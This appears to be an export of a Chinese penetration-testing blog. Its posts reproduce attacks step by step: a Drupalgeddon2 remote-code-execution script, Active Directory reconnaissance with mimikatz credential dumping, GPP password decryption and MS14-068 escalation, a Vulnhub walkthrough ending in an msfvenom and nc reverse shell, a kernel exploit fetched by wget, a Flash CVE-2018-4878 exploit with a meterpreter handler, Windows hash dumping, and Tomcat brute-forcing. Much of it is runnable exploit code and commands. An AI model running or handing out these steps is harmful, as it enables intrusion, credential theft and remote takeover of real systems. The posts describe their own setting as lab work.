buildform用户可控，可以传入mail[#post_render]、mail[#type]数组，即用户注入。而后uploadAjaxCallback方法可解析上面的数组，call_user_fun对于对于部分#属性数组值处理，导致任意代码执行。当做元素解析。导致远程代码执行漏洞。 在Drupal中render方法里#pre_render在render之前操作数组，#post_render接收render的结果并在其添加包装，#lazy_builder用于在render过程的最后添加元素。 我们来调试 一下： 如图可以看出 数组 成功变为元素解析。 这样我们就可以通过构造mail[#post_render]形式的数组进行攻击。 0X01漏洞复现对于较新的版本。在本地复现成功：Drupal8.5.0，Drupal8.4.5，Drupal8.4.4，Drupal8.4.3； 通杀EXP！ 安装 Drupal8.5.0：额Drupal 带翻译可以在线下载。 https://ftp.drupal.org/files/projects/drupal-8.5.0.tar.gz Drupal8.4.4 https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz 。。。 这样一看下载地址很清楚。 payload: 1http://localhost/drupal-8.5.0/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax post 内容： 123&apos;mail[a][#lazy_builder][0]&apos;: &apos;system&apos;,&apos;mail[a][#lazy_builder][1][]&apos;: &apos;whoami&apos;,&apos;form_id&apos;: &apos;user_register_form&apos; Python 小脚本1234567891011121314151617#!/usr/bin/envimport sysimport requestsurl = 'http://localhost/drupal-8.5.0/'payload = &#123; 'mail[test][#lazy_builder][0]': 'system', 'mail[test][#lazy_builder][1][]': 'whoami', 'form_id': 'user_register_form'&#125;target = url + 'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'r = requests.post(target, data=payload, verify=False)print(r.headers)print(r.text) 本地 Drupal8.5.0 复现成功 本地Drupal8.4.5 复现成功 本地Drupal8.4.4 复现成功 本地Drupal8.4.3复现成功 0X02 参考https://research.checkpoint.com/uncovering-drupalgeddon-2/ https://paper.seebug.org/567/","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"域内信息收集","slug":"域内信息收集","date":"2018-04-11T13:03:56.000Z","updated":"2019-02-19T03:32:08.374Z","comments":true,"path":"2018/04/11/域内信息收集/","link":"","permalink":"https://shackles.top/2018/04/11/域内信息收集/","excerpt":"","text":"域内信息收集 ​ 记录下域内信息收集的技巧总结 SRV记录（标明主机服务信息）SRV是DNS中的一种资源记录。SRV记录用于将服务的名称映射到提供该服务的服务器的DNS计算机名称。 简单来说，它标明了哪台主机提供哪种服务的信息。 Windows域中的服务会注册下列格式的srv记录： ​ _Service._Protocol.DnsDomainName 在windows域中，活动目录的正常工作依赖于DNS。 活动目录服务器通过tcp协议提供LDAP服务，因此它注册的srv记录类似于： ​ _ldap._tcp.example.com 域控制器则会以下面的形式注册srv记录： ​ _Service._Protocol.DCType._msdcs.DomainName, 这里的DCType可以是dc(域控制器),gc(全局编录),pdc(主域控制器)等。 例如：_ldap._tcp.dc._msdcs.example.com nslookupnslookup是一种网络管理工具，用于查询域名系统（DNS）以获取域名或IP地址映射或任何其他特定的DNS记录。 域控制器会注册一个srv记录，因此可以通过使用nslookup来查询这个srv记录，定位域控制器。 交互式命令： 12345nslookup # 进入交互式界面set type=all # 设置记录类型，可以设置为srvldap.tcp.dc._msdcs.exist.local # 执行查询 nslookup输出 nslookup 输出： 123456789101112131415服务器: UnKnownAddress: 172.17.0.128ldap.tcp.dc._msdcs.exist.com SRV service location: priority = 0 weight = 100 port = 389 svr hostname = win-dc.example.comwin-dc.example.com internet address = 172.17.0.128 # 这里就是域控的地址 SPN(服务主体名称)SPN全名服务主体名称，作用是对服务进行唯一的标识。 在windows域中，服务实例需要注册一个spn，这样才能使用kerberos身份验证。SPN的注册格式为： 1ServiceName/FQDN:&lt;port | servicename&gt; FQDN是指完全限定域名。它可以标识出主机的逻辑位置。FQDN的格式为：主机名.域名，例如，一台搭载webserver的服务器主机名为webserver，域名为example.com，则FQDN为webserver.example.com SPN扫描 ​ 在windows域环境中，spn扫描是发现服务最好的一种方式，因为spn扫描的原理是使用ldap来向域控查询，因此不需要扫描内网中的每一台主机，流量不仅较小而且也很正常（kerberos认证依赖spn）。 下列是一些spn服务名的示例： 1234567TERMSERV - RDPHOST - 主机VNC - VNC服务器MSSQL - sql server 更多的spn服务名称，可以参考：https://adsecurity.org/?page_id=183 Setspn使用Setspn.exe Setspn是一款管理spn的命令行软件。我们可以用它来查看某台主机或账户的spn 示例： 查看netbios名称为DM1主机的spn 1Setspn –L DM1 查看账户example的spn 1Setspn –L example 查看当前域中的所有spn 1Setspn –T ＊ -Q / 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970C:\\Users\\shackle&gt;Setspn缺少参数: accountname。用法: Setspn [modifiers switch] [accountname] 其中 \"accountname\" 可以是目标计算机或 用户帐户的名称或域\\名称 编辑模式开关: -R = 重置 HOST ServicePrincipalName 用法: setspn -R accountname -S = 验证不存在重复项之后，添加任意 SPN 用法: setspn -S SPN accountname -D = 删除任意 SPN 用法: setspn -D SPN accountname -L = 列出在目标帐户中注册的 SPN 用法: setspn [-L] accountname 编辑模式修饰符: -C = 指定 accountname 是计算机帐户 -U = 指定 accountname 是用户帐户 注意: -C 和 -U 具有排他性。如果两者均未指定， 则工具在存在此类计算机时将 accountname 解释为计算机名， 不存在时解释为用户名。 查询模式开关: -Q = 查询 SPN 是否存在 用法: setspn -Q SPN -X = 搜索重复的 SPN 用法: setspn -X 注意: 搜索重复项(尤其在林范围内)可能需要 较长的时间，并占用大量内存。 -Q 将在 每个目标域/林上执行。-X 将返回存在于所有目标中的 重复项。不要求 SPN 在各个林之间是唯一的， 但重复项可能会导致在跨林进行身份验证时 出现身份验证问题。 查询模式修饰符: -P = 抑制控制台的进度，可在将输出重定向到 文件时或在无人参与脚本中使用时使用。 直到命令完成后，才会输出内容。 -F = 在林级别而不是域级别执行查询 -T = 在指定的域或林(同时使用 -F 时)上执行查询 用法: setspn -T domain (开关和其他参数) 可以使用 \"\" 或 * 表示当前域或林。 注意: 可以将这些修饰符与 -S 开关一起使用， 以便在添加 SPN 之前指定应在何处执行重复检查。 注意: 可以多次指定 -T。示例:setspn -R daserver1 它将注册 SPN \"HOST/daserver1\" 和 \"HOST/&#123;DNS of daserver1&#125;\"setspn -S http/daserver daserver1 如果域中不存在 SPN \"http/daserver\"， 它将为计算机 \"daserver1\" 注册此类 SPNsetspn -D http/daserver daserver1 它将删除计算机 \"daserver1\" 的 SPN \"http/daserver\"setspn -F -S http/daserver daserver1 如果林中不存在 SPN \"http/daserver\"， 它将为计算机 \"daserver1\" 注册此类 SPNsetspn -U -S http/daserver dauser 如果域中不存在 SPN \"http/daserver\"， 它将为用户帐户 \"dauser\" 注册此类 SPNsetspn -T * -T bar -X 它将报告此域和 bar 中的所有重复 SPN 注册setspn -T bar -F -Q */daserver 它将查找在 bar 所属的林中以 */daserver 形式 注册的所有 SPN Netview使用（收集域内主机共享、ip、是否为域控等信息）Netview.exe Netview 能够收集域内主机共享、ip、是否为域控等信息。 Github项目地址：https://github.com/mubix/netview ​ 将主机名（或ip地址）列表保存在文件host.txt中，使用netview –f host.txt来信息收集 Netsess.exe 工具能够列举目标主机上的NetBIOS session，通常不依赖于管理员权限（-full参数列出所有会话需要管理权限）。 下载地址：http://www.joeware.net/freetools/tools/netsess/index.htm 示例： ​ 如果有一台域成员（192.168.1.128）机器net view了本机的共享（192.168.1.130），那么它与本机之间会存在一个netbios会话，可以使用下列命令来查看会话用户： 1netsess -h 192.168.1.130 -c \\192.168.1.128 这里的-h参数指定了服务器的地址，-c参数则指定了客户端的地址 Nltest（测试域间的信任关系）Nltest.exe Nltest可以用来测试域间的信任关系。 示例： Nltest /domain_trusts 输出如下： 12345List of domain trusts: 0: TURING turing.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: 0x20 ) 1: SUBDOMAIN subdomain.turing.com (NT 5) (Forest: 0) (Primary Domain) (Native) Nltest.exe 以域A做参照域（Primary Domain），另一个域为域B。 ①Direct Inbound（内传） 域B为信任域，域A为可信域。信任方向B -》A ②Direct Outbound（外传） 域A为信任域，域B为可信域。信任方向A -》 B ADFind（活动目录查询工具）Adfind是一款活动目录查询工具。 下载地址：http://www.joeware.net/freetools/tools/adfind/ 用户手册：http://www.joeware.net/freetools/tools/adfind/usage.htm 示例： 查询域中活动的主机,输出主机名和域名 1Adfind –sc computers_active name dnshostname 列出域控列表 1Adfind –sc dclist 根据email查询域用户 1Adfind –sc email:exist@example.com ADFind示例 示例： 查询域中主机的spn 1Adfind -b cn=computers,dc=example,dc=com servicePrincipalName 查询域管理员账户 1Adfind -b cn=&quot;Domain admins&quot;,cn=users,dc=example,dc=com member 获取dns记录 1AdFind.exe -b DC=exist.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=example,DC=com dn PVEFindADUser(定位用户登录位置)PVEFindADUser.exe 用来定位用户登录的位置，依赖管理员权限，输出会保存在一个csv文件中。 Github地址：https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe 示例： 显示每台计算机上登录的用户 1PVEFindaduser –current -noping 查看172.17.0.132主机上登录的用户 1PVEFindADuser -current -target 172.17.0.132 查看每台计算机上次登录的用户 1PVEFindADuser -last PowerSploitPowerSploit是一款powershell后渗透框架 项目地址：https://github.com/PowerShellMafia/PowerSploit 框架一共分为下面几大块： 123456789101112131415CodeExecution - 代码执行，用来执行代码、dll注入、shellcode注入等AntivirusBypass - 用来检测杀软特征码Exfiltration - 主要用来窃取敏感数据，比如sam数据库，窃取用户密码、记录键盘等Mayhem - 可以使目标蓝屏等Persistence - 用于持久控制Privesc - 用于帮助提权Recon - 信息收集模块ScriptModification - 脚本加密、混淆等 PowerSploit中的脚本可以单独拿出来使用。 通常的使用方法是： 1.首先Powershell –ep bypass 2.然后Import-Module 脚本名 3.最后调用脚本中的函数名，比如import了invoke-shellcode.ps1,则执行可以输入invoke-shellcode arg1 arg2 1234567891011示例：Invoke-Mimikatz是Mimikatz的powershell版。有些功能需要bypass uac。获取内存中的凭证： invoke-mimikatz –dumpcreds执行mimikatz命令 invoke-mimikatz -command “token::whoami exit” PowerView工具PowerView Powerview是一款域渗透工具。它包含了部分adfind拥有的功能，同时增加了一些新的功能。 工具使用powershell开发，配合cobalt strike等工具使用十分方便。 下载地址：https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 项目的README在https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon， 里面有Powerview中的函数说明。 参考文章： https://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/ 遇到不知道如何使用的函数时，记得使用get-help 12345678910111.Get-NetDomain - 获取域信息2.Get-NetForest - 获取林信息3.Get-NetDomainController - 获取域控制器信息4.Get-Proxy – 获取代理信息5.Invoke-ProcessHunter - 获取进程信息，可以指定用户名搜索，也可以指定进程名搜索6.Get-NetShare - 获取共享信息 CSVDE&amp;LDIFDE工具Csvde和ldifde的功能基本相同，都是从ad ds中导入/导出数据，区别在于前者处理csv格式的数据，后者处理ldif格式的数据。Csvde参数与ldifde参数基本相同，这里仅举csvde的几个例子： 在安装了ad ds/lds服务的计算机上才会启用此工具，工具位于%windir%\\system32\\csvde.exe 从活动目录中导出用户信息： csvde -d “cn=users,dc=example,dc=com” –r “objectclass=user” –f output.csv 从活动目录中导出域控信息： csvde -d “ou=domain\\20controllers,dc=example,dc=com” -r “objectclass=computer” –f output.csv -d 参数用来设置rootdn，说简单点就是目录树搜索开始的地方， -r参数指定过滤器 ADExplorer.exe工具ADExplorer.exe 一款查看域结构的工具。 下载地址：https://download.sysinternals.com/files/AdExplorer.zip LDAPSearch工具LDAPSearch Ldapsearch是linux下的ldap客户端。 示例： ​ ldapsearch -x -h 172.17.0.128 -b “cn=computers,dc=example,dc=com” -D “exist@example.com“ –w “123456” “(!(dnshostname=DOMAIN1DM1.example.com))“ 参数解释： ​ -x 进行认证 ​ -h 设置主机 ​ -b 设置basedn ​ -D 设置用户名 ​ -w 设置密码 ​ “(!(dnshostname=DOMAIN1DM1.example.com))“ 对结果进行过滤，使用ldap语法 横向拓展常见漏洞利用GPP漏洞组策略 组策略是windows操作系统中的一种基础架构，用来帮助管理员对用户及计算机实施特定的配置。 组策略分为两种类型：本地组策略和域组策略。本地组策略适用于未加入域和已加入域但未登录到域的计算机。域组策略存储在域控制器上，只能在活动目录环境中使用。 组策略对象 组策略对象（GPO）是一组组策略设置的集合。 组策略首选项 组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。 组策略对象包含两部分：组策略容器（GPC）和组策略模板（GPT）。组策略容器存储在ad数据库中，主要记录gpo的版本和属性等信息，而组策略模板则是一个文件夹，位置默认在%systemroot%\\sysvol\\sysvol\\domainname\\Policies{GUID} SYSVOL文件夹 默认位置在%systemroot%\\sysvol，用来存储组策略配置及脚本等文件，其子文件夹sysvol对应于DC上的SYSVOL共享，域成员均有权限读取此共享。 GPP漏洞 1.管理员常用组策略首选项功能： 为所有域成员主机添加本地用户。 2.添加此组策略首选项后，当域成员更新组策略时，会从域控的sysvol共享中下载一个groups.xml文件，里面有新建用户的信息，其中包含了加密的密码 3.Xml文件内容示例： 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;\"&gt;&lt;User clsid=\"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;\" name=\"example\" image=\"2\" changed=\"2018-03-05 13:40:42\" uid=\"&#123;0C50F05E-D3D5-4C91-B5FE-8991CD22231D&#125;\" userContext=\"0\" removePolicy=\"0\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"example\" description=\"\" cpassword=\"SZ/RdrwxoUkV5Gv+C5cYmdW7XWbSfA6WFaY+7xTlIU8\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" subAuthority=\"\" userName=\"example\"/&gt;&lt;/User&gt;&lt;/Groups&gt; 微软公开了它的对称AES密钥，因此我们可以对其进行解密。 介绍一款漏洞利用的工具：Get-GPPPassword 这个powershell脚本包含在powersploit框架中。使用时需要import-module后调用get-gpppassword这个cmdlet。 如果出现下列错误： Get-DecryptedCpassword : 找不到类型 [System.Security.Cryptography.AesCryptoServiceProvider]: 请确保已加载包含此类型的程序集。 可以在运行前执行下列命令：Add-Type -AssemblyName System.Core MS14-068漏洞MS14-068 Ms14-068漏洞可以使任意一个普通域用户提升至 域管理员权限。 利用工具： Kekeo 项目地址： https://github.com/gentilkiwi/kekeo 示例： 在拿到一个域用户的密码后，使用下列命令生成票据： Exploit::ms14068 /domain:example.com /user:example /password:Welcometoexample 这会在kekeo目录下生成一张票据。之后使用kerberos::purge来清除内存中已有的票据，等待数秒后，使用 Kerberos::ptt 票据文件名 来导入票据。如果上述操作没有问题的话，现在已经拥有域管理员权限，可以使用dir \\域控主机名\\c$来测试一下权限，能列出目录则说明已是域管理员权限。","categories":[],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://shackles.top/tags/内网渗透/"}]},{"title":"Vulnhub 靶机渗透初见","slug":"BSides Vancouver","date":"2018-04-09T15:53:56.000Z","updated":"2019-02-19T03:32:12.222Z","comments":true,"path":"2018/04/09/BSides Vancouver/","link":"","permalink":"https://shackles.top/2018/04/09/BSides Vancouver/","excerpt":"","text":"Vulnhub 靶机渗透初见0X00 前言Vulnhub 是国外Vulnhub 团队建设的一套 靶机镜像网站，提供虚拟机的形式的靶机镜像、直接下载使用、一般来说是一个整套的系统(linux居多）。下面对平台上靶机系统进行渗透测试。 https://www.vulnhub.com/ 0X01 BSides Vancouver: 2018 (Workshop）下载地址：BSides Vancouver: 2018 (Workshop) ~ VulnHub，可使用种子下载，速度较快。 下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。 信息收集：老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞， nbtscan 192.168.1.1/24nmap -A 192.168.1.32 下载 users.txt.bk 得到用户名 12345abatchyjohnmaiannedoomguy 漏洞利用wpscan -u http://192.168.1.32/backup_wordpress/wpscan -u http://192.168.1.32/backup_wordpress -username john –wordlist /usr/share/wordlists/rockyou.txt 利用 wp_admin_shell_upload 漏洞 爆破 密码得到enigma 1234567891011use exploit/unix/webapp/wp_admin_shell_uploadmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpressmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username johnmsf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigmamsf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit 权限维持但是没有root权限，下一步需要提权。 一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。cat crontab ，把远控脚本写入/usr/local/bin/cleanup中，执行，用nc反向连接。 msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R #msfveom 生成python后门 上传python远控木马 nc -lvp 9866 # nc 反向监听 0X02 总结通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。","categories":[],"tags":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://shackles.top/tags/靶机渗透/"}]},{"title":"","slug":"ctf-web","date":"2018-03-29T23:18:41.441Z","updated":"2018-03-29T14:11:49.898Z","comments":true,"path":"2018/03/30/ctf-web/","link":"","permalink":"https://shackles.top/2018/03/30/ctf-web/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"CVE-2017-16995 Ubuntu16.04漏洞","slug":"CVE-2017-16995 Ubuntu16.04","date":"2018-03-17T15:53:56.000Z","updated":"2018-04-03T14:39:52.215Z","comments":true,"path":"2018/03/17/CVE-2017-16995 Ubuntu16.04/","link":"","permalink":"https://shackles.top/2018/03/17/CVE-2017-16995 Ubuntu16.04/","excerpt":"","text":"CVE-2017-16995 Ubuntu16.04影响版本：Linux内核：Linux Kernel Version 4.14 ~ 4.4Ubuntu版本：16.04.01~ 16.04.04 提权 12345678使用cat /proc/version查看Linux内核版本 ：cat /etc/shadow查看账号密码payload:wget http://cyseclabs.com/pub/upstream44.cgcc -o test upstream44.c chmod +x exp./exp 漏洞原理emmmm 不懂 修复和缓解建议：目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用： 1# echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"Adobe远程代码执行漏洞-CVE-2018-4878","slug":"Adobe远程代码执行漏洞-CVE-2018-4878","date":"2018-03-06T04:52:08.000Z","updated":"2019-02-19T03:32:12.491Z","comments":true,"path":"2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/","link":"","permalink":"https://shackles.top/2018/03/06/Adobe远程代码执行漏洞-CVE-2018-4878/","excerpt":"","text":"Adobe远程代码执行漏洞-CVE-2018-4878漏洞原理&emsp;&emsp;2018年2月1日， Adobe官方发布了Adobe Flash Player系列产品的安全通告（APSA18-01），一个最新的Adobe Flash零日漏洞被发现针对韩国地区的人员发起攻击，该0day漏洞编号为CVE-2018-4878，目前最新版本28.0.0.137及其以前版本的Adobe Flash Player均受漏洞影响，Adobe官方将于2月5日发布漏洞补丁。CVE-2018-4878的被用于针对Windows用户的有限的针对性攻击。这些攻击利用通过电子邮件分发嵌入式恶意Flash内容的Office文档。 &emsp;&emsp;如下图所示影响 Flash Player28.0.0.137以及之前的所有版本 https://helpx.adobe.com/security/products/flash-player/apsa18-01.html 漏洞复现第一步 生成payload进入CVE-2018-4878-payload目录中 用msfvenom生成python语言的shellcode。 1msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.11 lport=8118 -f python&gt;shellcode.txt 1cat shellcode.txt 生成目录如下图所示（如需更改vim编辑）： 把使用实验环境所给的tmp.py文件追加到已经把shellcode.txt改名为payload.py文件中。得到最终的payload.py才是我们的攻击完整的程序。 12cp shellcode.txt payload.pycat tmp.py &gt;&gt;payload.py payload.py 文件部分如下，可以根据情况更改： 执行我们的攻击程序payload.py。生成exploit.swf与index.html文件。 1python payload.py 接下来开启apache服务也就是我们的Web服务诱导目标用户访问。 1sudo service apache2 start sudo 需要输入密码 为360College 可以看到Apache服务开启。我们再吧index.html与exploit.swf文件复制到/var/www/html目录下也就是Apache服务器的web访问目录，使用户可以访问我们的这些文件，从而漏洞利用。 12sudo cp index.html /var/www/html/index2.html sudo cp exploit.swf /var/www/html/exploit.swf 第二步 Metasploit 利用启动Metasploit，执行以下命令，监听端口，等待目标上钩，反弹shell到kali攻击机。 123456msfconsole use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.11 [攻击机IP地址]set lport 8118exploit 第三步 靶机上钩在靶机上，安装Adobe Flash Player软件。点击安装，下一步即可安装。 安装成功。 打开IE浏览器。 在IE浏览器上输入。kali攻击机IP地址 1http://192.168.0.11 [kali攻击机IP地址] 第三步 后渗透阶段靶机在输入kali攻击机IP地址后，在kali攻击机中的msf可以看到。成功反弹靶机shell。 得到meterpreter，输入sysinfo看到靶机的系统信息。可进一步的渗透。 1sysinfo","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://shackles.top/tags/漏洞复现/"}]},{"title":"口令暴力破解实验","slug":"口令暴破解实验","date":"2018-02-16T09:52:08.000Z","updated":"2019-02-19T03:32:08.895Z","comments":true,"path":"2018/02/16/口令暴破解实验/","link":"","permalink":"https://shackles.top/2018/02/16/口令暴破解实验/","excerpt":"","text":"#口令暴力破解实验 实验原理&emsp;&emsp; 早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。在Windows中使用安全帐户管理器 (SAM) 数据库中或 Active Directory 数据库中存储用户记录。每个密码被加密并存储在 SAM 数据库中或在 Active Directory 数据库。 Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值 例如： 用户名称为：Administrator Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC::: ​ 表示R为： ​ ID为：500 ​ LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE​ NT-HASH值为：683020925C5D8569C23AA724774CE6CC 实验步骤1、使用 mimikatz 获取明文密码​ mimikatz是一款功能强大的轻量级调试神器，提升进程权限注入进程读取进程内存，使用 mimikatz 获取明文密码。 首先用管理员身份打开命令终端窗口cmd。 &emsp;&emsp;使用 mimikatz 获取明文密码，用管理员身份打开命令终端窗口cmd。 点击确定 复制目录文件，到桌面下mimikatz_trunk目录下的Win32目录下并执行mimikatz命令。 12cd C:\\Users\\college\\Desktop\\mimikatz_trunk\\Win32mimikatz 执行mimikatz命令后可看到进入mimikatz软件交互界面。 进入mimikatz软件交互界面后执行以下命令。 123privilege::debugsekurlsa::logonpasswords 如图所示得到明文密码，另SHA1密码可在线破解 2、使用 pwdump7 获取密码NTLM hashNTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash 该NTLM hash的生成方法： 将明文口令转换成十六进制的格式 转换成Unicode格式，即在每个字节之后添加0x00 对Unicode字符串作MD4加密，生成32位的十六进制数字串 同上一个实验，进入管理员cmd，进入pwdump7 目录，执行以下命令，可得到本地NTLM hash。1234cd C:\\Users\\college\\Desktop\\pwdump7pwdump7 1234Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::college:1000:NO PASSWORD*********************:7C70A81C7C5882C24298D391FD397885:::user:1001:NO PASSWORD*********************:57D583AA46D571502AAD4BB7AEA09C70::: 可在线破解NTLM 密码 http://www.cmd5.com/ 思考与总结&emsp;&emsp;通过本次实验，成功实现了Windows 下密码的抓取与剖解，了解windows系统密码Hash 相关知识。","categories":[],"tags":[{"name":"口令","slug":"口令","permalink":"https://shackles.top/tags/口令/"}]},{"title":"Tomcat 系列漏洞利用与安全加固","slug":"中间件安全-Tomcat 系列漏洞利用与安全加固","date":"2018-02-03T15:53:56.000Z","updated":"2018-11-15T03:34:06.937Z","comments":true,"path":"2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/","link":"","permalink":"https://shackles.top/2018/02/03/中间件安全-Tomcat 系列漏洞利用与安全加固/","excerpt":"","text":"Tomcat 系列漏洞利用与安全加固0x00 前言​ Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。 ​ 由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。 Tomcat 重要目录 /bin - Tomcat 脚本存放目录（如启动、关闭脚本）。 *.sh 文件用于 Unix 系统； *.bat 文件用于 Windows 系统。 /conf - Tomcat 配置文件目录。 /logs - Tomcat 默认日志目录。 /webapps - webapp 运行的目录。 web 工程发布目录结构一般 web 项目路径结构 123456789101112|-- webapp # 站点根目录 |-- META-INF # META-INF 目录 | `-- MANIFEST.MF # 配置清单文件 |-- WEB-INF # WEB-INF 目录 | |-- classes # class文件目录 | | |-- *.class # 程序需要的 class 文件 | | `-- *.xml # 程序需要的 xml 文件 | |-- lib # 库文件夹 | | `-- *.jar # 程序需要的 jar 包 | `-- web.xml # Web应用程序的部署描述文件 |-- &lt;userdir&gt; # 自定义的目录 |-- &lt;userfiles&gt; # 自定义的资源文件 webapp：工程发布文件夹。其实每个 war 包都可以视为 webapp 的压缩包。 META-INF：META-INF 目录用于存放工程自身相关的一些信息，元文件信息，通常由开发工具，环境自动生成。 WEB-INF：Java web应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。 /WEB-INF/classes：存放程序所需要的所有 Java class 文件。 /WEB-INF/lib：存放程序所需要的所有 jar 文件。 /WEB-INF/web.xml：web 应用的部署配置文件。它是工程中最重要的配置文件，它描述了 servlet 和组成应用的其它组件，以及应用初始化参数、安全管理约束等。 0x01 漏洞利用1. 发现目标的 tomcat 管理控制台入口第一种,通过常规端口扫描,获取服务 banner 1# nmap -n -sT -Pn --open -v -p 8080-8090,8443 -sV 192.168.3.100-200 tomcat 的默认端口通常情况下都会在这个区间内,至于具体用什么扫无所谓,masscan,zmap 都一样,只不过 nmap 会识别的更精准 第二种,通过各类外部 web 搜索引擎进行批量抓取 123Googele dorks:nurl:/manager/html intitle:apache tomcat site:*.target.* 通 常 ,Tomcat 控 制 台 的 默 认 路 径 都 为 /manager/html intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat site:*.target.* 在低版本的 tomcat 欢迎页中还会写有 CATALINA 的路径,可把此作为关键字来精确搜索intext:$CATALINA_HOME/webapps/ROOT/ intitle:Apache Tomcat/6.0.24 site:*.target.* 可以只找特定版本的 tomcat,比如,爆出专门针对某个特定版本 tomcat 的漏洞 12Bing dorks:intitle:&quot;apache tomcat&quot; site:target.com 搜集特定目标的所有 tomcat 入口,个人觉得 bing 有时候比 google 更精准 第三种,通过各类空间搜索引擎进行批量抓取 [ 此处暂以 shodan 为例, zoomeye,fofa,censys…其实都差不多,不差钱的情况下,个人还是更建议直接用 shodan,毕竟它没有处理过搜索结果,脚本配合 api 批量抓会很方便 ] 1net:&quot;40.112.0.0/16&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot; 对某些大目标来讲,可先尝试获取它的 as 号,然后再根据 as 号查到的网段,批量抓 tomcat 入口 2. 低版本 tomcat 管理控制台的弱口令爆破 此处暂以 tomcat 6.0.9 为例进行演示 注意,此处所说的低版本 tomcat,通常是指 7.x 以下的版本,不包括 7.x,因为在 7.x 之后的版本中开始加入了防爆机制,会自动锁定正在爆破的用户,所以如果你在实战中看到 tomcat 7.x 以后的版本,基本都不用再尝试爆破了,也几乎不太可能爆出来,ok,说完利用前提,我们就来实际的干,首先,去添加好 tomcat 控制台角色用户,到 C:\\apache-tomcat-6.0.9\\conf\\tomcat-users.xml 文件的标签内添加如下用户,注意,6.x 的角色名称可能不大一样,在角色后面没有-gui,7.x 版本之后的才有,配置完之后,运行 C:\\apache-tomcat-6.0.9\\bin\\startup.bat 脚本即可启动 tomcat 服务 123role rolename=\"manager\"/&gt;&lt;role rolename=\"admin\"/&gt;&lt;user username=\"tomcat\" password=\"tomcat\" roles=\"manager,admin\"/&gt; 爆破 msf 中的 tomcat_mgr_login 模块 123456msf &gt; use auxiliary/scanner/http/tomcat_mgr_loginmsf &gt; set rhosts 192.168.3.188 msf &gt; set rport 8080msf &gt; set targeturi /manager/html msf &gt; set username tomcatmsf &gt; set pass_file /root/wordlist/passwd.txtmsf &gt; set stop_on_success true msf &gt; set bruteforce_speed 2msf &gt; run 常见的 Tomcat 管理控制台弱口令: 1234567891011121314151617181920212223242526272829admin:passwordadmin:Password1 